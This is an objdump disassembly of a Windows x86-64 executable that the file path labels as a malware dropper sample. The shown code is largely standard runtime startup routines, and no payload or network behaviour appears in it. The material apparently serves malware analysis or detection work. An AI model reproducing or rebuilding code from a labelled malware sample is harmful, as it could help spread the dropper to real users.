
malware_samples/dropper/2ab82d7829e3473ddd4e3e356aaa44a4ea09aa7dc84818c92a6360b4430a4a78.exe:     file format pei-x86-64


Disassembly of section .retplne:

0000000140001000 <.retplne>:
   140001000:	c3                   	ret
   140001001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001008:	00 00 00 00 
   14000100c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001010:	55                   	push   %rbp
   140001011:	48 89 e5             	mov    %rsp,%rbp
   140001014:	48 83 ec 20          	sub    $0x20,%rsp
   140001018:	48 8b 05 51 44 00 00 	mov    0x4451(%rip),%rax        # 0x140005470
   14000101f:	31 c9                	xor    %ecx,%ecx
   140001021:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001027:	48 8b 05 52 44 00 00 	mov    0x4452(%rip),%rax        # 0x140005480
   14000102e:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001034:	48 8b 05 55 44 00 00 	mov    0x4455(%rip),%rax        # 0x140005490
   14000103b:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001041:	48 8b 05 c8 43 00 00 	mov    0x43c8(%rip),%rax        # 0x140005410
   140001048:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   14000104d:	75 0f                	jne    0x14000105e
   14000104f:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   140001053:	48 01 d0             	add    %rdx,%rax
   140001056:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   14000105c:	74 6a                	je     0x1400010c8
   14000105e:	48 8b 05 fb 43 00 00 	mov    0x43fb(%rip),%rax        # 0x140005460
   140001065:	89 0d a1 6f 00 00    	mov    %ecx,0x6fa1(%rip)        # 0x14000800c
   14000106b:	8b 00                	mov    (%rax),%eax
   14000106d:	85 c0                	test   %eax,%eax
   14000106f:	74 47                	je     0x1400010b8
   140001071:	b9 02 00 00 00       	mov    $0x2,%ecx
   140001076:	e8 ad 15 00 00       	call   0x140002628
   14000107b:	e8 10 15 00 00       	call   0x140002590
   140001080:	48 8b 15 a9 44 00 00 	mov    0x44a9(%rip),%rdx        # 0x140005530
   140001087:	8b 12                	mov    (%rdx),%edx
   140001089:	89 10                	mov    %edx,(%rax)
   14000108b:	e8 10 15 00 00       	call   0x1400025a0
   140001090:	48 8b 15 79 44 00 00 	mov    0x4479(%rip),%rdx        # 0x140005510
   140001097:	8b 12                	mov    (%rdx),%edx
   140001099:	89 10                	mov    %edx,(%rax)
   14000109b:	e8 d0 04 00 00       	call   0x140001570
   1400010a0:	48 8b 05 19 43 00 00 	mov    0x4319(%rip),%rax        # 0x1400053c0
   1400010a7:	83 38 01             	cmpl   $0x1,(%rax)
   1400010aa:	74 54                	je     0x140001100
   1400010ac:	31 c0                	xor    %eax,%eax
   1400010ae:	48 83 c4 20          	add    $0x20,%rsp
   1400010b2:	5d                   	pop    %rbp
   1400010b3:	c3                   	ret
   1400010b4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010b8:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400010bd:	e8 66 15 00 00       	call   0x140002628
   1400010c2:	eb b7                	jmp    0x14000107b
   1400010c4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010c8:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400010cc:	66 81 fa 0b 01       	cmp    $0x10b,%dx
   1400010d1:	74 45                	je     0x140001118
   1400010d3:	66 81 fa 0b 02       	cmp    $0x20b,%dx
   1400010d8:	75 84                	jne    0x14000105e
   1400010da:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400010e1:	0f 86 77 ff ff ff    	jbe    0x14000105e
   1400010e7:	8b 90 f8 00 00 00    	mov    0xf8(%rax),%edx
   1400010ed:	31 c9                	xor    %ecx,%ecx
   1400010ef:	85 d2                	test   %edx,%edx
   1400010f1:	0f 95 c1             	setne  %cl
   1400010f4:	e9 65 ff ff ff       	jmp    0x14000105e
   1400010f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001100:	48 8b 0d 49 44 00 00 	mov    0x4449(%rip),%rcx        # 0x140005550
   140001107:	e8 d4 0b 00 00       	call   0x140001ce0
   14000110c:	31 c0                	xor    %eax,%eax
   14000110e:	48 83 c4 20          	add    $0x20,%rsp
   140001112:	5d                   	pop    %rbp
   140001113:	c3                   	ret
   140001114:	0f 1f 40 00          	nopl   0x0(%rax)
   140001118:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   14000111c:	0f 86 3c ff ff ff    	jbe    0x14000105e
   140001122:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
   140001129:	31 c9                	xor    %ecx,%ecx
   14000112b:	45 85 c0             	test   %r8d,%r8d
   14000112e:	0f 95 c1             	setne  %cl
   140001131:	e9 28 ff ff ff       	jmp    0x14000105e
   140001136:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000113d:	00 00 00 
   140001140:	55                   	push   %rbp
   140001141:	48 89 e5             	mov    %rsp,%rbp
   140001144:	48 83 ec 30          	sub    $0x30,%rsp
   140001148:	48 8b 05 11 44 00 00 	mov    0x4411(%rip),%rax        # 0x140005560
   14000114f:	4c 8d 05 c2 6e 00 00 	lea    0x6ec2(%rip),%r8        # 0x140008018
   140001156:	48 8d 15 c3 6e 00 00 	lea    0x6ec3(%rip),%rdx        # 0x140008020
   14000115d:	48 8d 0d c4 6e 00 00 	lea    0x6ec4(%rip),%rcx        # 0x140008028
   140001164:	8b 00                	mov    (%rax),%eax
   140001166:	89 05 98 6e 00 00    	mov    %eax,0x6e98(%rip)        # 0x140008004
   14000116c:	48 8b 05 ad 43 00 00 	mov    0x43ad(%rip),%rax        # 0x140005520
   140001173:	44 8b 08             	mov    (%rax),%r9d
   140001176:	48 8d 05 87 6e 00 00 	lea    0x6e87(%rip),%rax        # 0x140008004
   14000117d:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001182:	e8 91 14 00 00       	call   0x140002618
   140001187:	90                   	nop
   140001188:	48 83 c4 30          	add    $0x30,%rsp
   14000118c:	5d                   	pop    %rbp
   14000118d:	c3                   	ret
   14000118e:	66 90                	xchg   %ax,%ax
   140001190:	55                   	push   %rbp
   140001191:	41 55                	push   %r13
   140001193:	41 54                	push   %r12
   140001195:	57                   	push   %rdi
   140001196:	56                   	push   %rsi
   140001197:	53                   	push   %rbx
   140001198:	48 83 ec 28          	sub    $0x28,%rsp
   14000119c:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400011a1:	48 8b 1d 08 43 00 00 	mov    0x4308(%rip),%rbx        # 0x1400054b0
   1400011a8:	4c 8b 25 a1 81 00 00 	mov    0x81a1(%rip),%r12        # 0x140009350
   1400011af:	31 ff                	xor    %edi,%edi
   1400011b1:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400011b8:	00 00 
   1400011ba:	48 8b 70 08          	mov    0x8(%rax),%rsi
   1400011be:	eb 11                	jmp    0x1400011d1
   1400011c0:	48 39 c6             	cmp    %rax,%rsi
   1400011c3:	0f 84 6f 01 00 00    	je     0x140001338
   1400011c9:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011ce:	41 ff d4             	call   *%r12
   1400011d1:	48 89 f8             	mov    %rdi,%rax
   1400011d4:	f0 48 0f b1 33       	lock cmpxchg %rsi,(%rbx)
   1400011d9:	48 85 c0             	test   %rax,%rax
   1400011dc:	75 e2                	jne    0x1400011c0
   1400011de:	48 8b 35 db 42 00 00 	mov    0x42db(%rip),%rsi        # 0x1400054c0
   1400011e5:	31 ff                	xor    %edi,%edi
   1400011e7:	8b 06                	mov    (%rsi),%eax
   1400011e9:	83 f8 01             	cmp    $0x1,%eax
   1400011ec:	0f 84 5d 01 00 00    	je     0x14000134f
   1400011f2:	8b 06                	mov    (%rsi),%eax
   1400011f4:	85 c0                	test   %eax,%eax
   1400011f6:	0f 84 b4 01 00 00    	je     0x1400013b0
   1400011fc:	c7 05 02 6e 00 00 01 	movl   $0x1,0x6e02(%rip)        # 0x140008008
   140001203:	00 00 00 
   140001206:	8b 06                	mov    (%rsi),%eax
   140001208:	83 f8 01             	cmp    $0x1,%eax
   14000120b:	0f 84 53 01 00 00    	je     0x140001364
   140001211:	85 ff                	test   %edi,%edi
   140001213:	0f 84 6c 01 00 00    	je     0x140001385
   140001219:	48 8b 05 e0 41 00 00 	mov    0x41e0(%rip),%rax        # 0x140005400
   140001220:	48 8b 00             	mov    (%rax),%rax
   140001223:	48 85 c0             	test   %rax,%rax
   140001226:	74 0c                	je     0x140001234
   140001228:	45 31 c0             	xor    %r8d,%r8d
   14000122b:	ba 02 00 00 00       	mov    $0x2,%edx
   140001230:	31 c9                	xor    %ecx,%ecx
   140001232:	ff d0                	call   *%rax
   140001234:	e8 07 07 00 00       	call   0x140001940
   140001239:	48 8b 0d 00 43 00 00 	mov    0x4300(%rip),%rcx        # 0x140005540
   140001240:	ff 15 02 81 00 00    	call   *0x8102(%rip)        # 0x140009348
   140001246:	48 8b 15 53 42 00 00 	mov    0x4253(%rip),%rdx        # 0x1400054a0
   14000124d:	48 8d 0d ac fd ff ff 	lea    -0x254(%rip),%rcx        # 0x140001000
   140001254:	48 89 02             	mov    %rax,(%rdx)
   140001257:	e8 74 13 00 00       	call   0x1400025d0
   14000125c:	e8 ef 04 00 00       	call   0x140001750
   140001261:	8b 1d c1 6d 00 00    	mov    0x6dc1(%rip),%ebx        # 0x140008028
   140001267:	8d 7b 01             	lea    0x1(%rbx),%edi
   14000126a:	48 63 ff             	movslq %edi,%rdi
   14000126d:	48 c1 e7 03          	shl    $0x3,%rdi
   140001271:	48 89 f9             	mov    %rdi,%rcx
   140001274:	e8 17 14 00 00       	call   0x140002690
   140001279:	4c 8b 2d a0 6d 00 00 	mov    0x6da0(%rip),%r13        # 0x140008020
   140001280:	49 89 c4             	mov    %rax,%r12
   140001283:	85 db                	test   %ebx,%ebx
   140001285:	0f 8e 45 01 00 00    	jle    0x1400013d0
   14000128b:	48 83 ef 08          	sub    $0x8,%rdi
   14000128f:	31 db                	xor    %ebx,%ebx
   140001291:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001298:	49 8b 4c 1d 00       	mov    0x0(%r13,%rbx,1),%rcx
   14000129d:	e8 06 14 00 00       	call   0x1400026a8
   1400012a2:	48 8d 70 01          	lea    0x1(%rax),%rsi
   1400012a6:	48 89 f1             	mov    %rsi,%rcx
   1400012a9:	e8 e2 13 00 00       	call   0x140002690
   1400012ae:	49 89 f0             	mov    %rsi,%r8
   1400012b1:	49 89 04 1c          	mov    %rax,(%r12,%rbx,1)
   1400012b5:	49 8b 54 1d 00       	mov    0x0(%r13,%rbx,1),%rdx
   1400012ba:	48 89 c1             	mov    %rax,%rcx
   1400012bd:	48 83 c3 08          	add    $0x8,%rbx
   1400012c1:	e8 d2 13 00 00       	call   0x140002698
   1400012c6:	48 39 df             	cmp    %rbx,%rdi
   1400012c9:	75 cd                	jne    0x140001298
   1400012cb:	4c 01 e7             	add    %r12,%rdi
   1400012ce:	48 c7 07 00 00 00 00 	movq   $0x0,(%rdi)
   1400012d5:	4c 89 25 44 6d 00 00 	mov    %r12,0x6d44(%rip)        # 0x140008020
   1400012dc:	e8 6f 02 00 00       	call   0x140001550
   1400012e1:	48 8b 05 38 41 00 00 	mov    0x4138(%rip),%rax        # 0x140005420
   1400012e8:	4c 8b 05 29 6d 00 00 	mov    0x6d29(%rip),%r8        # 0x140008018
   1400012ef:	8b 0d 33 6d 00 00    	mov    0x6d33(%rip),%ecx        # 0x140008028
   1400012f5:	48 8b 00             	mov    (%rax),%rax
   1400012f8:	4c 89 00             	mov    %r8,(%rax)
   1400012fb:	48 8b 15 1e 6d 00 00 	mov    0x6d1e(%rip),%rdx        # 0x140008020
   140001302:	e8 49 2b 00 00       	call   0x140003e50
   140001307:	8b 0d ff 6c 00 00    	mov    0x6cff(%rip),%ecx        # 0x14000800c
   14000130d:	89 05 fd 6c 00 00    	mov    %eax,0x6cfd(%rip)        # 0x140008010
   140001313:	85 c9                	test   %ecx,%ecx
   140001315:	0f 84 bd 00 00 00    	je     0x1400013d8
   14000131b:	8b 15 e7 6c 00 00    	mov    0x6ce7(%rip),%edx        # 0x140008008
   140001321:	85 d2                	test   %edx,%edx
   140001323:	74 6b                	je     0x140001390
   140001325:	48 83 c4 28          	add    $0x28,%rsp
   140001329:	5b                   	pop    %rbx
   14000132a:	5e                   	pop    %rsi
   14000132b:	5f                   	pop    %rdi
   14000132c:	41 5c                	pop    %r12
   14000132e:	41 5d                	pop    %r13
   140001330:	5d                   	pop    %rbp
   140001331:	c3                   	ret
   140001332:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001338:	48 8b 35 81 41 00 00 	mov    0x4181(%rip),%rsi        # 0x1400054c0
   14000133f:	bf 01 00 00 00       	mov    $0x1,%edi
   140001344:	8b 06                	mov    (%rsi),%eax
   140001346:	83 f8 01             	cmp    $0x1,%eax
   140001349:	0f 85 a3 fe ff ff    	jne    0x1400011f2
   14000134f:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   140001354:	e8 df 12 00 00       	call   0x140002638
   140001359:	8b 06                	mov    (%rsi),%eax
   14000135b:	83 f8 01             	cmp    $0x1,%eax
   14000135e:	0f 85 ad fe ff ff    	jne    0x140001211
   140001364:	48 8b 15 75 41 00 00 	mov    0x4175(%rip),%rdx        # 0x1400054e0
   14000136b:	48 8b 0d 5e 41 00 00 	mov    0x415e(%rip),%rcx        # 0x1400054d0
   140001372:	e8 d1 12 00 00       	call   0x140002648
   140001377:	c7 06 02 00 00 00    	movl   $0x2,(%rsi)
   14000137d:	85 ff                	test   %edi,%edi
   14000137f:	0f 85 94 fe ff ff    	jne    0x140001219
   140001385:	31 c0                	xor    %eax,%eax
   140001387:	48 87 03             	xchg   %rax,(%rbx)
   14000138a:	e9 8a fe ff ff       	jmp    0x140001219
   14000138f:	90                   	nop
   140001390:	e8 ab 12 00 00       	call   0x140002640
   140001395:	8b 05 75 6c 00 00    	mov    0x6c75(%rip),%eax        # 0x140008010
   14000139b:	48 83 c4 28          	add    $0x28,%rsp
   14000139f:	5b                   	pop    %rbx
   1400013a0:	5e                   	pop    %rsi
   1400013a1:	5f                   	pop    %rdi
   1400013a2:	41 5c                	pop    %r12
   1400013a4:	41 5d                	pop    %r13
   1400013a6:	5d                   	pop    %rbp
   1400013a7:	c3                   	ret
   1400013a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400013af:	00 
   1400013b0:	48 8b 15 49 41 00 00 	mov    0x4149(%rip),%rdx        # 0x140005500
   1400013b7:	48 8b 0d 32 41 00 00 	mov    0x4132(%rip),%rcx        # 0x1400054f0
   1400013be:	c7 06 01 00 00 00    	movl   $0x1,(%rsi)
   1400013c4:	e8 7f 12 00 00       	call   0x140002648
   1400013c9:	e9 38 fe ff ff       	jmp    0x140001206
   1400013ce:	66 90                	xchg   %ax,%ax
   1400013d0:	48 89 c7             	mov    %rax,%rdi
   1400013d3:	e9 f6 fe ff ff       	jmp    0x1400012ce
   1400013d8:	89 c1                	mov    %eax,%ecx
   1400013da:	e8 91 12 00 00       	call   0x140002670
   1400013df:	90                   	nop
   1400013e0:	55                   	push   %rbp
   1400013e1:	48 89 e5             	mov    %rsp,%rbp
   1400013e4:	48 83 ec 20          	sub    $0x20,%rsp
   1400013e8:	48 8b 05 71 40 00 00 	mov    0x4071(%rip),%rax        # 0x140005460
   1400013ef:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   1400013f5:	e8 96 fd ff ff       	call   0x140001190
   1400013fa:	90                   	nop
   1400013fb:	90                   	nop
   1400013fc:	48 83 c4 20          	add    $0x20,%rsp
   140001400:	5d                   	pop    %rbp
   140001401:	c3                   	ret
   140001402:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001409:	00 00 00 00 
   14000140d:	0f 1f 00             	nopl   (%rax)
   140001410:	55                   	push   %rbp
   140001411:	48 89 e5             	mov    %rsp,%rbp
   140001414:	48 83 ec 20          	sub    $0x20,%rsp
   140001418:	48 8b 05 41 40 00 00 	mov    0x4041(%rip),%rax        # 0x140005460
   14000141f:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001425:	e8 66 fd ff ff       	call   0x140001190
   14000142a:	90                   	nop
   14000142b:	90                   	nop
   14000142c:	48 83 c4 20          	add    $0x20,%rsp
   140001430:	5d                   	pop    %rbp
   140001431:	c3                   	ret
   140001432:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001439:	00 00 00 00 
   14000143d:	0f 1f 00             	nopl   (%rax)
   140001440:	55                   	push   %rbp
   140001441:	48 89 e5             	mov    %rsp,%rbp
   140001444:	48 83 ec 20          	sub    $0x20,%rsp
   140001448:	e8 0b 12 00 00       	call   0x140002658
   14000144d:	48 83 f8 01          	cmp    $0x1,%rax
   140001451:	19 c0                	sbb    %eax,%eax
   140001453:	48 83 c4 20          	add    $0x20,%rsp
   140001457:	5d                   	pop    %rbp
   140001458:	c3                   	ret
   140001459:	90                   	nop
   14000145a:	90                   	nop
   14000145b:	90                   	nop
   14000145c:	90                   	nop
   14000145d:	90                   	nop
   14000145e:	90                   	nop
   14000145f:	90                   	nop
   140001460:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140001470
   140001467:	e9 d4 ff ff ff       	jmp    0x140001440
   14000146c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001470:	c3                   	ret
   140001471:	90                   	nop
   140001472:	90                   	nop
   140001473:	90                   	nop
   140001474:	90                   	nop
   140001475:	90                   	nop
   140001476:	90                   	nop
   140001477:	90                   	nop
   140001478:	90                   	nop
   140001479:	90                   	nop
   14000147a:	90                   	nop
   14000147b:	90                   	nop
   14000147c:	90                   	nop
   14000147d:	90                   	nop
   14000147e:	90                   	nop
   14000147f:	90                   	nop
   140001480:	55                   	push   %rbp
   140001481:	48 89 e5             	mov    %rsp,%rbp
   140001484:	48 83 ec 20          	sub    $0x20,%rsp
   140001488:	48 8b 05 71 2b 00 00 	mov    0x2b71(%rip),%rax        # 0x140004000
   14000148f:	48 8b 00             	mov    (%rax),%rax
   140001492:	48 85 c0             	test   %rax,%rax
   140001495:	74 26                	je     0x1400014bd
   140001497:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000149e:	00 00 
   1400014a0:	ff d0                	call   *%rax
   1400014a2:	48 8b 05 57 2b 00 00 	mov    0x2b57(%rip),%rax        # 0x140004000
   1400014a9:	48 8d 50 08          	lea    0x8(%rax),%rdx
   1400014ad:	48 8b 40 08          	mov    0x8(%rax),%rax
   1400014b1:	48 89 15 48 2b 00 00 	mov    %rdx,0x2b48(%rip)        # 0x140004000
   1400014b8:	48 85 c0             	test   %rax,%rax
   1400014bb:	75 e3                	jne    0x1400014a0
   1400014bd:	48 83 c4 20          	add    $0x20,%rsp
   1400014c1:	5d                   	pop    %rbp
   1400014c2:	c3                   	ret
   1400014c3:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400014ca:	00 00 00 00 
   1400014ce:	66 90                	xchg   %ax,%ax
   1400014d0:	55                   	push   %rbp
   1400014d1:	56                   	push   %rsi
   1400014d2:	53                   	push   %rbx
   1400014d3:	48 83 ec 20          	sub    $0x20,%rsp
   1400014d7:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400014dc:	48 8b 15 ed 3e 00 00 	mov    0x3eed(%rip),%rdx        # 0x1400053d0
   1400014e3:	48 8b 02             	mov    (%rdx),%rax
   1400014e6:	89 c1                	mov    %eax,%ecx
   1400014e8:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400014eb:	74 43                	je     0x140001530
   1400014ed:	85 c9                	test   %ecx,%ecx
   1400014ef:	74 22                	je     0x140001513
   1400014f1:	89 c8                	mov    %ecx,%eax
   1400014f3:	83 e9 01             	sub    $0x1,%ecx
   1400014f6:	48 8d 1c c2          	lea    (%rdx,%rax,8),%rbx
   1400014fa:	48 29 c8             	sub    %rcx,%rax
   1400014fd:	48 8d 74 c2 f8       	lea    -0x8(%rdx,%rax,8),%rsi
   140001502:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001508:	ff 13                	call   *(%rbx)
   14000150a:	48 83 eb 08          	sub    $0x8,%rbx
   14000150e:	48 39 f3             	cmp    %rsi,%rbx
   140001511:	75 f5                	jne    0x140001508
   140001513:	48 8d 0d 66 ff ff ff 	lea    -0x9a(%rip),%rcx        # 0x140001480
   14000151a:	48 83 c4 20          	add    $0x20,%rsp
   14000151e:	5b                   	pop    %rbx
   14000151f:	5e                   	pop    %rsi
   140001520:	5d                   	pop    %rbp
   140001521:	e9 1a ff ff ff       	jmp    0x140001440
   140001526:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000152d:	00 00 00 
   140001530:	31 c0                	xor    %eax,%eax
   140001532:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001538:	44 8d 40 01          	lea    0x1(%rax),%r8d
   14000153c:	89 c1                	mov    %eax,%ecx
   14000153e:	4a 83 3c c2 00       	cmpq   $0x0,(%rdx,%r8,8)
   140001543:	4c 89 c0             	mov    %r8,%rax
   140001546:	75 f0                	jne    0x140001538
   140001548:	eb a3                	jmp    0x1400014ed
   14000154a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001550:	8b 05 da 6a 00 00    	mov    0x6ada(%rip),%eax        # 0x140008030
   140001556:	85 c0                	test   %eax,%eax
   140001558:	74 06                	je     0x140001560
   14000155a:	c3                   	ret
   14000155b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001560:	c7 05 c6 6a 00 00 01 	movl   $0x1,0x6ac6(%rip)        # 0x140008030
   140001567:	00 00 00 
   14000156a:	e9 61 ff ff ff       	jmp    0x1400014d0
   14000156f:	90                   	nop
   140001570:	31 c0                	xor    %eax,%eax
   140001572:	c3                   	ret
   140001573:	90                   	nop
   140001574:	90                   	nop
   140001575:	90                   	nop
   140001576:	90                   	nop
   140001577:	90                   	nop
   140001578:	90                   	nop
   140001579:	90                   	nop
   14000157a:	90                   	nop
   14000157b:	90                   	nop
   14000157c:	90                   	nop
   14000157d:	90                   	nop
   14000157e:	90                   	nop
   14000157f:	90                   	nop
   140001580:	55                   	push   %rbp
   140001581:	48 89 e5             	mov    %rsp,%rbp
   140001584:	48 83 ec 20          	sub    $0x20,%rsp
   140001588:	83 fa 03             	cmp    $0x3,%edx
   14000158b:	74 13                	je     0x1400015a0
   14000158d:	85 d2                	test   %edx,%edx
   14000158f:	74 0f                	je     0x1400015a0
   140001591:	b8 01 00 00 00       	mov    $0x1,%eax
   140001596:	48 83 c4 20          	add    $0x20,%rsp
   14000159a:	5d                   	pop    %rbp
   14000159b:	c3                   	ret
   14000159c:	0f 1f 40 00          	nopl   0x0(%rax)
   1400015a0:	e8 ab 0a 00 00       	call   0x140002050
   1400015a5:	b8 01 00 00 00       	mov    $0x1,%eax
   1400015aa:	48 83 c4 20          	add    $0x20,%rsp
   1400015ae:	5d                   	pop    %rbp
   1400015af:	c3                   	ret
   1400015b0:	55                   	push   %rbp
   1400015b1:	56                   	push   %rsi
   1400015b2:	53                   	push   %rbx
   1400015b3:	48 83 ec 20          	sub    $0x20,%rsp
   1400015b7:	48 8d 6c 24 20       	lea    0x20(%rsp),%rbp
   1400015bc:	48 8b 05 ed 3d 00 00 	mov    0x3ded(%rip),%rax        # 0x1400053b0
   1400015c3:	83 38 02             	cmpl   $0x2,(%rax)
   1400015c6:	74 06                	je     0x1400015ce
   1400015c8:	c7 00 02 00 00 00    	movl   $0x2,(%rax)
   1400015ce:	83 fa 02             	cmp    $0x2,%edx
   1400015d1:	74 15                	je     0x1400015e8
   1400015d3:	83 fa 01             	cmp    $0x1,%edx
   1400015d6:	74 48                	je     0x140001620
   1400015d8:	b8 01 00 00 00       	mov    $0x1,%eax
   1400015dd:	48 83 c4 20          	add    $0x20,%rsp
   1400015e1:	5b                   	pop    %rbx
   1400015e2:	5e                   	pop    %rsi
   1400015e3:	5d                   	pop    %rbp
   1400015e4:	c3                   	ret
   1400015e5:	0f 1f 00             	nopl   (%rax)
   1400015e8:	48 8d 1d 69 8a 00 00 	lea    0x8a69(%rip),%rbx        # 0x14000a058
   1400015ef:	48 8d 35 62 8a 00 00 	lea    0x8a62(%rip),%rsi        # 0x14000a058
   1400015f6:	48 39 f3             	cmp    %rsi,%rbx
   1400015f9:	74 dd                	je     0x1400015d8
   1400015fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001600:	48 8b 03             	mov    (%rbx),%rax
   140001603:	48 85 c0             	test   %rax,%rax
   140001606:	74 02                	je     0x14000160a
   140001608:	ff d0                	call   *%rax
   14000160a:	48 83 c3 08          	add    $0x8,%rbx
   14000160e:	48 39 f3             	cmp    %rsi,%rbx
   140001611:	75 ed                	jne    0x140001600
   140001613:	b8 01 00 00 00       	mov    $0x1,%eax
   140001618:	48 83 c4 20          	add    $0x20,%rsp
   14000161c:	5b                   	pop    %rbx
   14000161d:	5e                   	pop    %rsi
   14000161e:	5d                   	pop    %rbp
   14000161f:	c3                   	ret
   140001620:	e8 2b 0a 00 00       	call   0x140002050
   140001625:	b8 01 00 00 00       	mov    $0x1,%eax
   14000162a:	48 83 c4 20          	add    $0x20,%rsp
   14000162e:	5b                   	pop    %rbx
   14000162f:	5e                   	pop    %rsi
   140001630:	5d                   	pop    %rbp
   140001631:	c3                   	ret
   140001632:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001639:	00 00 00 00 
   14000163d:	0f 1f 00             	nopl   (%rax)
   140001640:	31 c0                	xor    %eax,%eax
   140001642:	c3                   	ret
   140001643:	90                   	nop
   140001644:	90                   	nop
   140001645:	90                   	nop
   140001646:	90                   	nop
   140001647:	90                   	nop
   140001648:	90                   	nop
   140001649:	90                   	nop
   14000164a:	90                   	nop
   14000164b:	90                   	nop
   14000164c:	90                   	nop
   14000164d:	90                   	nop
   14000164e:	90                   	nop
   14000164f:	90                   	nop
   140001650:	55                   	push   %rbp
   140001651:	56                   	push   %rsi
   140001652:	53                   	push   %rbx
   140001653:	48 83 ec 70          	sub    $0x70,%rsp
   140001657:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   14000165c:	0f 11 75 00          	movups %xmm6,0x0(%rbp)
   140001660:	0f 11 7d 10          	movups %xmm7,0x10(%rbp)
   140001664:	44 0f 11 45 20       	movups %xmm8,0x20(%rbp)
   140001669:	83 39 06             	cmpl   $0x6,(%rcx)
   14000166c:	0f 87 ca 00 00 00    	ja     0x14000173c
   140001672:	8b 01                	mov    (%rcx),%eax
   140001674:	48 8d 15 89 3b 00 00 	lea    0x3b89(%rip),%rdx        # 0x140005204
   14000167b:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   14000167f:	48 01 d0             	add    %rdx,%rax
   140001682:	ff e0                	jmp    *%rax
   140001684:	0f 1f 40 00          	nopl   0x0(%rax)
   140001688:	48 8d 1d 70 3a 00 00 	lea    0x3a70(%rip),%rbx        # 0x1400050ff
   14000168f:	f2 44 0f 10 41 20    	movsd  0x20(%rcx),%xmm8
   140001695:	f2 0f 10 79 18       	movsd  0x18(%rcx),%xmm7
   14000169a:	f2 0f 10 71 10       	movsd  0x10(%rcx),%xmm6
   14000169f:	48 8b 71 08          	mov    0x8(%rcx),%rsi
   1400016a3:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400016a8:	e8 33 0f 00 00       	call   0x1400025e0
   1400016ad:	f2 44 0f 11 44 24 30 	movsd  %xmm8,0x30(%rsp)
   1400016b4:	49 89 d8             	mov    %rbx,%r8
   1400016b7:	48 8d 15 1a 3b 00 00 	lea    0x3b1a(%rip),%rdx        # 0x1400051d8
   1400016be:	f2 0f 11 7c 24 28    	movsd  %xmm7,0x28(%rsp)
   1400016c4:	48 89 c1             	mov    %rax,%rcx
   1400016c7:	49 89 f1             	mov    %rsi,%r9
   1400016ca:	f2 0f 11 74 24 20    	movsd  %xmm6,0x20(%rsp)
   1400016d0:	e8 a3 0f 00 00       	call   0x140002678
   1400016d5:	90                   	nop
   1400016d6:	0f 10 75 00          	movups 0x0(%rbp),%xmm6
   1400016da:	0f 10 7d 10          	movups 0x10(%rbp),%xmm7
   1400016de:	31 c0                	xor    %eax,%eax
   1400016e0:	44 0f 10 45 20       	movups 0x20(%rbp),%xmm8
   1400016e5:	48 83 c4 70          	add    $0x70,%rsp
   1400016e9:	5b                   	pop    %rbx
   1400016ea:	5e                   	pop    %rsi
   1400016eb:	5d                   	pop    %rbp
   1400016ec:	c3                   	ret
   1400016ed:	0f 1f 00             	nopl   (%rax)
   1400016f0:	48 8d 1d e9 39 00 00 	lea    0x39e9(%rip),%rbx        # 0x1400050e0
   1400016f7:	eb 96                	jmp    0x14000168f
   1400016f9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001700:	48 8d 1d 39 3a 00 00 	lea    0x3a39(%rip),%rbx        # 0x140005140
   140001707:	eb 86                	jmp    0x14000168f
   140001709:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001710:	48 8d 1d 09 3a 00 00 	lea    0x3a09(%rip),%rbx        # 0x140005120
   140001717:	e9 73 ff ff ff       	jmp    0x14000168f
   14000171c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001720:	48 8d 1d 69 3a 00 00 	lea    0x3a69(%rip),%rbx        # 0x140005190
   140001727:	e9 63 ff ff ff       	jmp    0x14000168f
